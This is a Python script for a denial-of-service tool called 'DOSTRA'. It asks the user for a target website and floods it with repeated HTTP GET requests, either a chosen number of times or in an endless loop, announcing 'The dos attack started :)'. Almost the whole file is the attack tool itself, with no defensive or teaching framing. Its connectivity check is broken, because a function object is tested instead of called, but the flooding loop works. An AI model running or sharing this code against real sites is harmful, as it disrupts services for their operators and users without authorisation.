import lib.CheckPackage as CheckPackage
CheckPackage.CheckPackageClass.InstallModule()
import re
from turtle import color
import requests
import os
from termcolor import colored

def main():
    print(colored("██████╗░░█████╗░░██████╗████████╗██████╗░░█████╗░", 'blue'))
    print(colored("██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗", 'blue'))
    print(colored("██║░░██║██║░░██║╚█████╗░░░░██║░░░██████╔╝███████║", 'blue'))
    print(colored("██║░░██║██║░░██║░╚═══██╗░░░██║░░░██╔══██╗██╔══██║", 'blue'))
    print(colored("██████╔╝╚█████╔╝██████╔╝░░░██║░░░██║░░██║██║░░██║", 'blue'))
    print(colored("╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝", 'blue'))
    print(colored("-------------------------------------------------",
          'white', attrs=['blink']))
    print(colored("| 𝕞𝕒𝕕𝕖 𝕓𝕪 𝕩-𝕥𝕣𝕒.𝕩𝕪𝕫 (𝕖𝕞𝕒𝕟𝕦𝕖𝕝 𝕧𝕚𝕔𝕥𝕠𝕣) x EHSNDVR (Editation) |\n", 'green'))
main()
def dos():
    strUserInput = ""
    while True:
        strUserInput = input(
            colored("enter your target\n example: google.com\n\n ~> ", 'magenta'))
        strUserInput = f"http://{strUserInput}" if not re.match(
            r"^(https|http):\/\/", strUserInput) else strUserInput
        if re.match(r"^(https|http):\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)", strUserInput):
            break
        else:
            print(colored("\n~ Please enter a valid website address ~\n", "red"))
            continue
    TargetURL = requests.get(strUserInput).url
    import socket
    def IsConnected():
        try:
            Host = socket.gethostbyname(TargetURL)
            TargetURL = socket.create_connection((Host, 80), 2)
            return True
        except:
            pass
        return False
    if IsConnected:
        strContinuation = input(
            colored("Do you want continue? y/n? ~> ", 'yellow')).lower()
        if strContinuation == 'y':
            PacketSize = input(colored(
                "enter your PacketSize Size\n-------------------\nexample: 100000\n-------------------\nor :Enter \"u\" if you want the PacketSize to be unlimited \n ~> ", 'cyan'))
            intCountPacketSend = 0
            if PacketSize.lower() == "u":
                print(colored("The dos attack started :)", 'green'))
                while True:
                    requests.get(TargetURL)
                    print(
                        colored(f"Pocket was sent ({intCountPacketSend})", 'red'))
                    intCountPacketSend += 1
                    requests.get(TargetURL)
                    print(
                        colored(f"Pocket was sent ({intCountPacketSend})", 'blue'))
                    intCountPacketSend += 1
            elif int(PacketSize) >= 1:
                print(colored("The dos attack started :)", 'green'))
                while intCountPacketSend <= int(PacketSize):
                    requests.get(TargetURL)
                    print(
                        colored(f"Pocket was sent ({intCountPacketSend})", 'red'))
                    intCountPacketSend += 1
                    requests.get(TargetURL)
                    print(
                        colored(f"Pocket was sent ({intCountPacketSend})", 'blue'))
                    intCountPacketSend += 1
            else:
                print(
                    colored("Please enter the correct number of packets :(", 'red'))
        elif strContinuation == 'n':
            os.system("cls" if os.name == "nt" else "clear")
            main()
            dos()
        else:
            print(colored("Please use the correct character :(", 'red'))
    else:
        print("Please enter a valid website address")
dos()
